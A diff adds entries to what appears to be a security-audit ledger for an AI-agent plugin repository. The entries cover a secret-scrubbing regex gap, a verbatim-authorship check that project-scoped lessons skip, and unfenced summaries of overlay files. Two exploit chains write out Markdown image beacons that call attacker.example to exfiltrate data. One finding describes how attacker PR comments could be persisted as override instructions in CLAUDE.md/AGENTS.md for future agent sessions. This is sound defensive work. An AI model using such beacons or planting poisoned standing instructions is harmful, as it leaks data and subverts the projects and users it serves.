@@ -2767,6 +2767,57 @@ location: plugins/ievo/skills/feedback/SKILL.md:306 (Step 4 — Attached: /ievo:
 
 `feedback/SKILL.md` Step 3.9 defines an explicit "Fence containment" rule for the tool-failure-record attachment: before embedding that block, scan the joined lines for the longest run of consecutive backticks and widen the fence to one character longer than that. Step 3.85/Step 4's sibling attachment — "Attached: /ievo:init run log", which embeds the full contents of `.ievo/log/init-*.md` — uses a fixed ` ```markdown ``` ` fence with no equivalent scan, confirmed by direct re-read at line 306. Exploit chain: a malicious skill/plugin published on skills.sh or the Codex marketplace carries a crafted `name`/`description` containing a backtick run (3+) followed by `![x](https://attacker.example/beacon.png?d=<data>)` — this candidate metadata is untrusted, externally-writable pre-install display text per `index-repos/SKILL.md` Step 2's own reasoning, not subject to any charset validation until actual install time. When the user runs `/ievo:init`, this candidate is logged verbatim into `.ievo/log/init-<timestamp>.md`'s "Candidates after dedup + ranking" table with no backtick-escaping. If the user later runs `/ievo:feedback` for an unrelated bug, accepts the Step 3.85 offer to attach that log (labeled "Recommended for bug reports"), and confirms Step 5's Submit gate, the embedded backtick run prematurely closes the fixed outer fence, letting the attacker's injected Markdown render live in the resulting public GitHub issue. Blast radius: confidentiality low / integrity none / availability none (rendering-only exfiltration-beacon/spoofed-link risk, same class as the already-fixed `inspect/SKILL.md`/`agents/evolution.md` Step 5 gaps). Recommendation: apply the same fence-containment procedure Step 3.9 already defines to the Step 3.85/Step 4 init-log attachment — scan for the longest backtick run in the log content and widen the fence to one character longer (minimum 3) before embedding, mirroring Step 3.9's rule for the block immediately below it.
 
+## S-2026-08-12-001 — scrub.mjs's secret-name matchers don't cover kebab-case names, missing Azure's real `api-key` header
+
+```yaml
+id: S-2026-08-12-001
+discovered_at: 2026-08-12T00:00:00Z
+run_id: 31574807801
+target_repo: ievo-ai/skills
+title: scrub.mjs's NAME_ALT/HTTP_CRED_HEADER_NAME redaction grammars cover snake_case, camelCase, and a bare-uppercase list, but no kebab-case shape — Azure OpenAI/Cognitive Services' real api-key header rides through unmatched
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/620
+cwe: CWE-532
+confidence: high
+location: plugins/ievo/scripts/scrub.mjs (NAME_ALT definition, HTTP_CRED_HEADER_NAME definition)
+```
+
+`NAME_ALT` recognizes secret-shaped assignment names only via snake_case (`[A-Za-z0-9_]*_(?:token|key|secret|password|id)`), camelCase (lower→upper transition), and a small bare-uppercase list — no grammar matches a hyphenated name, since a hyphen is outside the snake alternative's character class and isn't a camelCase transition. `HTTP_CRED_HEADER_NAME` only matches `Authorization`/`Cookie`/`Set-Cookie`. Azure's documented API auth header is literally `api-key` (lowercase, hyphenated, hex-string value — no provider-signature prefix for `PROVIDER_SECRET_RE` either), so a captured `curl -H "api-key: <value>"` call or JSON body containing that field passes through all five redaction passes unmatched and is persisted verbatim into `.ievo/evolution-candidates/<session-id>.jsonl`. Confidence high (concrete, real-world credential shape, directly verified against current regex source). Blast radius: confidentiality high / integrity none / availability none. Recommendation: add a kebab-case alternative to `NAME_ALT` (hyphen in place of underscore, applied case-insensitively) and add `api-key` to `HTTP_CRED_HEADER_NAME`.
+
+## S-2026-08-12-002 — evolution.md's verbatim-authorship gate skips project scope, letting attacker-authored PR-review text become a standing instruction in CLAUDE.md/AGENTS.md
+
+```yaml
+id: S-2026-08-12-002
+discovered_at: 2026-08-12T00:00:00Z
+run_id: 31574807801
+target_repo: ievo-ai/skills
+title: evolution.md Step 1's verbatim-authorship check (which blocks copy-pasted third-party text from becoming a standing agent/skill overlay instruction) explicitly and only applies to agent/skill scope — a project-scoped lesson skips it entirely, even though CLAUDE.md/AGENTS.md is read with override authority on every session
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/621
+cwe: CWE-1427
+confidence: medium
+location: plugins/ievo/agents/evolution.md Step 1 ("Verbatim-authorship check" section)
+```
+
+Exploit chain: an attacker posts a PR review/comment worded as a generic "team convention" (satisfying `review-retrospective.md`'s project-scope attribution rule); `/ievo:review-retrospective` clusters and classifies it `durable-lesson`/`Target: project`, parking it verbatim; a human later runs `/ievo:evo` on the parked cluster, and `evolution.md` Step 1 explicitly states project-scoped lessons skip the verbatim-authorship check ("read by the human-facing session rather than mechanically applied per-dispatch the same way") — the gate that would otherwise catch copy-pasted third-party text never fires. The lesson is appended to `.ievo/evolution/project.md`, which the `<!-- ievo:start -->` marker loads into CLAUDE.md/AGENTS.md on every future session with override framing ("apply ALL rules... IN ADDITION to the project's instructions"). Confidence medium (requires a human in the loop to forward the parked cluster into `/ievo:evo`, and review-retrospective's scope classification to land on `project` — both plausible but not automatic). Blast radius: confidentiality high / integrity high / availability low — a one-time external PR comment can become a persistent, high-authority instruction applied to every future AI agent session in the project. Recommendation: apply the same verbatim-authorship check to project-scoped lessons; the "read by the human session, not per-dispatch" rationale doesn't reduce risk since CLAUDE.md/AGENTS.md content is loaded with override authority on every session — arguably broader blast radius than a single agent/skill overlay. Mirror the fix in evo/SKILL.md's twin direct-execution check.
+
+## S-2026-08-12-003 — overlay-status/SKILL.md renders extracted overlay-file summaries with no excerpt containment, unlike every sibling display skill
+
+```yaml
+id: S-2026-08-12-003
+discovered_at: 2026-08-12T00:00:00Z
+run_id: 31574807801
+target_repo: ievo-ai/skills
+title: overlay-status/SKILL.md Steps 3 and 5 extract and render a summary from any .md file under .ievo/evolution/ (a committed, not-gitignored, unvalidated-provenance directory) with zero backtick-fencing, the only display-oriented SKILL.md in the module with no excerpt-containment rule
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/622
+cwe: CWE-79
+confidence: high
+location: plugins/ievo/skills/overlay-status/SKILL.md Step 3 (summary extraction) and Step 5 (render)
+```
+
+`.ievo/evolution/` is committed (not gitignored) project state per AGENTS.md/init/SKILL.md Step 10; Step 2 of this skill explicitly classifies unrecognized files under it as `Other` scope rather than rejecting them, with no provenance check that a file was actually produced by `/ievo:evo`'s own write path. Step 3 extracts a summary via a 5-item precedence (frontmatter `description:`, boilerplate subsection title, first heading, first non-blank line, raw text) with zero containment — confirmed by grep: this is the only display-oriented SKILL.md in the module with no "containment"/"backtick"/"fence" occurrences, unlike `feedback/SKILL.md`, `evo/SKILL.md` Step 4, and `deep-review/SKILL.md` Step 5. Step 5 then interpolates the raw extracted text into a Markdown list line wrapped only in double quotes, which are inert to Markdown. A planted `.ievo/evolution/*.md` file (via a malicious/compromised contributor, poisoned fork, or supply-chain-compromised postinstall step) with a summary containing `![x](https://attacker.example/beacon.png)` fires live the moment `/ievo:overlay-status` displays its report. Confidence high (straightforward, directly verified absence of any containment step). Blast radius: confidentiality low / integrity low / availability none. Recommendation: apply the same backtick-run-sizing containment pattern already used by `feedback/SKILL.md`, `evo/SKILL.md` Step 4, and `deep-review/SKILL.md` Step 5 to all five of Step 3's extraction paths before Step 5 renders them.
+
 ---
 
 
